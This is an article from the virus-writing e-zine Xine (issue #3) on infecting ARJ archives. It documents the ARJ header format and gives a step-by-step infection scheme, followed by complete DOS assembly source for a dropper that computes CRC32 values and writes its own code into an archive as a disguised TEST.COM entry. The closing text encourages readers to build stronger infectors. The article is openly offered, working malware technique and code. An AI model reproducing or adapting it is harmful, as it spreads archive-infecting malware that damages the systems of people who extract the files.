   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 109 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ;                          Dropping over ARJ archives
   ;                       From the Archives infector series
   ;                            By UnknowN MnemoniK/iKx
   ;
   ;
   ;   Introduction
   ;  +------------+
   ;
   ;  Arj  aren't  too  comon like zip or rar files but they are sometimes used
   ;  for compressing something  like cracks and  put into games or stuff  like
   ;  that. Arjs are also quite  simple to infect because you need just to drop
   ;  an header and the virus .
   ;
   ;   On The ground
   ;  +-------------+
   ;
   ;  There are three types of packets , the comment packet and the file packet,
   ;  both use the same header , and the final  packet is just the ARJ signature
   ;  plus a word with value 0 , so if you want infect an ARJ file, how you will
   ;  process? simple as bonjour, you read the first header and put it somewhere
   ;  go  to the end-4 , calculate  crc , write the header , write the virus and
   ;  write the final packet , everything will be done allright
   ;
   ;    Arj comment/file packet header type :
   ;
   ; OFFSET LABEL       TYP  VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ; 00     ARJSIG      DW   EA60        Local File Header Signature
   ; 02     HEADERSIZE  DW   0000        Header size , variable
   ; 04     INTERNSIZE  DB   00          Size between here and host data
   ; 05     VERSIONBY   DB   00          Version made by
   ; 06     VERSIONMIN  DB   00          Minimum version need to extract
   ; 07     HOSTOS      DB   00          Host operating system
   ;
   ;        value: 0 = MSDOS        3 = AMIGA       6 = APPLE GS    9 = VAX VMS
   ;               1 = PRIMOS       4 = MAC-OS      7 = ATARI ST
   ;               2 = UNIX         5 = OS/2        8 = NEXT
   ;
   ; 08     FLAGS       DB   00          Flags
   ;
   ;        Value: 1 = GARBLED_FLAG
   ;               2 = NOT USED
   ;               4 = VOLUME_FLAG
   ;               8 = EXTFILE_FLAG
   ;               10h = PATHSYM_FLAG
   ;               20h = BACKUP_FLAG
   ;
   ; 09     CMPMETHOD   DB   00          Compression method
   ;
   ;         Value: 0 = STORED                       1 = MOST COMPRESSED
   ;                2 = MIDDLE PLUS COMPRESSED       3 =MIDDLE FAST COMPRESSION
   ;                4 = FASTEST COMPRESSED
   ;
   ; 0A     FILETYPE    DB   00          Type of the file
   ;
   ;         Value: 0 = BINARY       1 = 7-BIT TEXT
   ;                3 = DIRECTORY    4 = VOLUMELABEL
   ;
   ; 0B     RESERVED    DB   'Z'         always 'Z' (not sure)
   ; 0C     DOSTIME     DW   0000        Time of creation of the file,Dos style
   ; 0E     DOSDATE     DW   0000        Date of creation of the file,Dos style
   ; 10     COMPRESSIZ  HEX  00000000    Compressed size
   ; 14     ORIGSIZ     HEX  00000000    Uncompressed size
   ; 18     CRC32       HEX  00000000    The CRC32 of compressed datas
   ; 1C     FILENAME    DS   ?           Filename with Null-End
   ; ??     COMMENT     DS   ?           Comment with Null-End
   ; ??     HEADCRC32   HEX  00000000    CRC32 of the header
   ; ??     EXTENDHEAD  DW   0           Extended Header - Unused
   ;
   ;  Arj have the particularity ( and RAR ) to need an header CRC , you render
   ;  CRC32 from Internal Header to Host Datas
   ;
   ;   Infection Step by Step
   ;  +----------------------+
   ;
   ;  For  the  infection , you  must fix  a variable version need , make , and
   ;  minimum, plus also fix the MSDOS in Hostos , and set flags to path symbol
   ;  When done , you can proceed to the infection scheme
   ;
   ;  1ø Open Arj file
   ;  2ø Read first header and put it somewhere for our virus
   ;  3ø Verify if it's really an arj
   ;  4ø check if we are already installed
   ;  5ø put ArjCrc32 the CRC of our virus
   ;  6ø put in HeaderCrc the CRC of the header
   ;  7ø Update Header ( Filename , Extended , comment size , etc etc... )
   ;  8ø Go to the end-4
   ;  9ø Write the header
   ;  10ø Write the virus
   ;  11ø Write final packet
   ;  12ø All done !
   ;
   ;  Improvements of this method are welcome
   ;
   ;   Usefull code
   ;  +------------+
   ;
   ;  You want a code that work ? get it!
   ;
   ; -----------------------------------------------------------------------------

   .model tiny
   .code
   .286

   org 100h

   start:

   mov ax,3d02h                                    ; open the file who is placed
   mov dx,offset arjname                           ; in arjname
   int 21h

   xchg ax,bx                                      ; exchange handle

   mov ax,4202h                                    ; go to the end
   xor cx,cx
   xor dx,dx
   int 21h

   xchg cx,dx                                      ; sub cx/dx(32 bits) 4
   mov dx,ax
   sub dx,4
   sbb cx,1
   add cx,1

   mov ax,4200h                                    ; go there
   int 21h

   mov cx,Fin-start                                ; render CRC of this code
   mov si,100h

   call Crc_calc

   mov word ptr [ArjCrc32],cx
   mov word ptr [ArjCrc32+2],dx

   mov ah,40h                                      ; read the first part
   mov cx,offset SecondSide-Header                 ; of the header
   mov dx,offset Header
   int 21h

   mov cx,ArjHeaderCrc-ArjHsmsize
   mov si,offset ArjHsmSize

   call Crc_calc                                   ; render CRC of the header

   mov word ptr [ArjHeaderCrc],cx
   mov word ptr [ArjHeaderCrc+2],dx

   mov ah,40h                                      ; write second part of the
   mov cx,FinSide-SecondSide                       ; header
   mov dx,offset SecondSide
   int 21h

   mov word ptr [ArjHeaderCrc],0                   ; clean all saved crc
   mov word ptr [ArjHeaderCrc+2],0

   mov word ptr [ArjCrc32],0                       ; to have a cleaned code
   mov word ptr [ArjCrc32+2],0

   mov ah,40h
   mov cx,Fin-start                                ; write the virus
   mov dx,offset Start
   int 21h

   mov word ptr [ArjHeadSiz],0                     ;set at ARjHeadS signature+w0

   mov ah,40h                                      ; write the end packet
   mov cx,4
   mov dx,offset Header
   int 21h

   mov ah,3eh                                      ; close the file
   int 21h

   ret                                             ; bye!

   crc_calc:

   push bx
   push si cx

   call crc_table              ; render crc table

   pop cx si

   mov bp,cx

   mov cx,0ffffh
   mov dx,0ffffh

   xor ax,ax

   Crc_loop:

   lodsb
   mov bx,ax
   xor bl,cl
   mov cl,ch
   mov ch,dl
   mov dl,dh
   mov dh,bh
   shl bx,1
   shl bx,1
   xor cx,word ptr [bx+di]
   xor dx,word ptr [bx+di+02]
   dec bp

   jnz Crc_loop

   not dx
   not cx

   pop bx
   ret

   crc_table:

   mov    di,offset starttable+1024-2  ; the buffer table
                       ; remember : It begin by the end
   mov    bp,255               ; set bp equal 255
                       ; 255 * 4 = 1024
   std                 ; set Direction Flag On

   TableHighloop:              ; the major loop in the Crc table Calc

   mov cx,8                ; set the minus loop to 8
   mov dx,bp               ; dx = bp , major counter loop
   xor     ax,ax               ; ax = zero

   TableLowLoop:

   shr    ax,1             ; mov one byte of ax at right in bin
   rcr    dx,1             ; if anything losted , put it on dx

   jae    anomality            ; if superior or equal skip encrypt.

   xor    dx,08320h            ; encrypt value by a signature
   xor    ax,0EDB8h            ;

   anomality:

   loop   TableLowLoop         ; make it 8 times

   stosw                   ; write ax
   xchg   dx,ax
   stosw                   ; not write dx
   dec    bp               ; decrement the counter

   jnz TableHighLoop           ; repeat it until bp = 0

   mov word ptr [di],0         ; last value equal 0
   sub di,2
   mov word ptr [di],0
   cld                 ; clear direction flag

   ret

   arjname:   db 'test.arj',0

   Header:

   ArjSig:     db 60h,0EAh         ; Arj signature
   ArjHeadsiz: dw 28h              ; Header size
   ArjHSmsize: db 1Eh              ; Internal header size
   ArjVer:     db 07h              ; Ver made by
   ArjMin:     db 01h              ; Minimum version to extract
   ArjHost:    db 0h               ; Host Operating System
   ArjFlags:   db 10h              ; Flags = path translated
   ArjMethod:  db 0h               ; Method = 0 = stored
   ArjFiletype:    db 0h               ; File type = 0 = binary
   ArjReserved:    db 'Z'              ; reserved ***
   ArjFileTime:    db 063h,078h            ; Time
   ArjFileDate:    db 031h,024h            ; Date
   ArjCompress:    dd fin-start            ; size compressed = uncompress.
   ArjOriginal:    dd fin-start            ; size uncompressed = compress.
   ArjCrc32:       dd 0                            ; Crc of The file
   ArjEntryName:   dw 0                ; Unknown (?)
   ArjAttribute:   dw 0                ; Attribute
   ArjHostData:    dw 0                ; Unknown May be unused

   SecondSide:

   ArjFilename:    db 'TEST.COM',0                ; FileName with Null-End
   ArjComment: db 0                ; Comment with Null-End
   ArjHeaderCrc:   db 4 dup (0)            ; Header Crc32
   ArjExtended:    db 0,0              ; Extended Header - Unused

   FinSide:

   fin:

   starttable: db  1024 dup (?)

   end start


   ; +------------------------------------------------------------------------+
   ;
   ;  Hep Littah'll coder, you wanna build a good arj infector? There are a lot
   ;  of tricks  you  can upgrade from my code  ,  first  , build a VXD  can be
   ;  the best thing to  do , second is  to detect if the  archive is locked or
   ;  see if the archive are in multi volume in that case ,don't infect at all!
   ;  you can also recode the CRC in 32 bits asm ,  it can be cool too. In this
   ;  code we work with our created header, you can put your program to use one
   ;  existing in the a real ARJ
   ;
   ;
   ;
   ; Les petits d‚linquants (C) Unkm'98 aka [StarZero/Ikx]
   ;
   ;
